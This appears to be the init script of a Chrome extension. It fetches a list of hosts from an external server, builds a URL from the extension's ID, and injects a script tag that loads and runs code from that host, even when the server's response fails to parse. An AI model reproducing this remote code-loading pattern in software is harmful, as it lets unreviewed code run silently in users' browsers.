var init_url='js/init.js';
var server_json="http://hkgfc.aws.af.cm/server";
			
$.ajax({
	url: server_json,
	success: function(response){
		var list=JSON.parse(response);
		var host='';
		list.shuffle();
		console.log(response,list);
		//var d=["hkgfc.aws.af.cm","hkgfg.aws.af.cm","hkgfc2.hp.af.cm"];
		//console.log(JSON.stringify(d));
		init_url='http://'+list[0]+'/init/'+chrome.i18n.getMessage("@@extension_id");
		/*$.getScript(init_url,function(){
			console.log('loaded init.js',extid);
		});*/
		
		$.ajax({url:init_url,success:function(response){
				try{
					var data=JSON.parse(response);
					/*var data=JSON.parse(response);
					if(data.status==400){
						console.log('Init fail',data);
					}*/
					console.log('init script',data);
					if(data.status==400){
						console.log('Init fail',data);
					}
					else{
						console.log(data);
						var js=document.createElement('script');
						js.setAttribute('type','text/javascript');
						js.setAttribute('src',''+init_url);
						$('head').get(0).appendChild(js);
					}
				}
				catch(e){
					console.log('Append js to header');
					var js=document.createElement('script');
					js.setAttribute('type','text/javascript');
					js.setAttribute('src',''+init_url);
					$('head').get(0).appendChild(js);
					console.log('cookie lp',$.cookie('left_panel'));
					
					
				}
			}
		});
	},
	error: function(){noty({text:'Get init file fail',layout:'center',type:'error'});}
});

